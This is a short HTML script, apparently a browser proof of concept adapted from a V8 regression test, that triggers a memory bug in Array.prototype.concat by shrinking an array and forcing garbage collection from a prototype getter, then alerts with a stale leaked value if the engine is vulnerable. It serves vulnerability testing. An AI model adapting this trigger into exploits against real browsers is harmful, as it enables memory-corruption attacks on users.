<script>
//https://chromium.googlesource.com/v8/v8/+/96a2bd8ae8c25e2acbe63319011cbb829b59e3df/test/mjsunit/regress/regress-crbug-594574-concat-leak-1.js

function gc(){
    for(var i=0;i<0x100000/16;i++){
        var a=new String();
    }
}

array = new Array(10)
array[0] = 0.1
//array[1] is null
array[2] = 2.1
array[3] = 3.1

var proto = {};
array.__proto__ = proto;

Object.defineProperty(proto, 1, { 
         get: function() { array.length = 1; gc(); return "value from proto";}, 
         set: function(new_value){} 
});

var concatted_array = Array.prototype.concat.call(array)

if(concatted_array[3]!=null){
	alert("concat is vulnerable");
	alert(concatted_array[3]);
}
</script>